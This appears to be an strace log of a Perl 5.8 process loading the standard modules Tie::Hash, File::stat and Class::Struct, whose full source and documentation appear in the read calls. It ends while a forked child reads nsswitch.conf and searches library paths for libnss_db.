11347 07:37:14.623092 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
11347 07:37:14.623417 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
11347 07:37:14.623990 read(8, "", 4096) = 0
11347 07:37:14.629802 close(8)          = 0
11347 07:37:14.629803 stat64("/etc/perl/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629803 stat64("/etc/perl/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629803 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629803 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629803 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629804 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629804 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629804 stat64("/usr/lib/perl5/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629811 stat64("/usr/share/perl5/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629824 stat64("/usr/share/perl5/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629837 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629850 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629864 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.629877 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
11347 07:37:14.629899 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.629914 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.629926 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.629943 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
11347 07:37:14.630361 stat64("/etc/perl/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640474 stat64("/etc/perl/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640494 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640561 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640593 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640607 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640635 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640647 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640660 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640672 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640685 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640698 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640712 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.640725 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
11347 07:37:14.640747 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
11347 07:37:14.640763 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61478) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.640775 _llseek(10, 0, [0], SEEK_CUR) = 0
11347 07:37:14.640818 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
11347 07:37:14.641225 brk(0x82de000)    = 0x82de000
11347 07:37:14.642006 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
11347 07:37:14.642615 _llseek(10, 6916, [6916], SEEK_SET) = 0
11347 07:37:14.642632 _llseek(10, 0, [6916], SEEK_CUR) = 0
11347 07:37:14.642643 close(10)         = 0
11347 07:37:14.642880 _llseek(8, 1334, [1334], SEEK_SET) = 0
11347 07:37:14.642897 _llseek(8, 0, [1334], SEEK_CUR) = 0
11347 07:37:14.642907 close(8)          = 0
11347 07:37:14.643559 brk(0x82ff000)    = 0x82ff000
11347 07:37:14.643703 _llseek(6, 2689, [2689], SEEK_SET) = 0
11347 07:37:14.643718 _llseek(6, 0, [2689], SEEK_CUR) = 0
11347 07:37:14.649802 close(6)          = 0
11347 07:37:14.649878 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e00908) = 11348
11348 07:37:14.649968 getppid()         = 11347
11348 07:37:14.650465 open("/etc/nsswitch.conf", O_RDONLY) = 6
11348 07:37:14.650488 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11348 07:37:14.650507 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc6000
11348 07:37:14.650521 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11348 07:37:14.650628 read(6, "", 4096) = 0
11348 07:37:14.650639 close(6)          = 0
11348 07:37:14.650649 munmap(0xb7fc6000, 4096) = 0
11348 07:37:14.650678 open("/etc/ld.so.cache", O_RDONLY) = 6
11348 07:37:14.650692 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11348 07:37:14.650722 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dcd000
11348 07:37:14.650733 close(6)          = 0
11348 07:37:14.650744 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11348 07:37:14.650761 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650776 stat64("/lib/tls/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650789 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650802 stat64("/lib/tls/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650814 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650827 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.650844 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650856 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.650873 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650885 stat64("/lib/tls/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650896 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650908 stat64("/lib/tls/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650919 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650931 stat64("/lib/tls/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650941 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650953 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11348 07:37:14.650969 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.650981 stat64("/lib/i686/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.650992 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651004 stat64("/lib/i686/sse2", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651015 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651027 stat64("/lib/i686/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651355 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651547 stat64("/lib/i686", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651627 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
11348 07:37:14.651671 stat64("/lib/sse2/cmov", 0xbfb61ffc) = -1 ENOENT (No such file or directory)
11348 07:37:14.651712 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
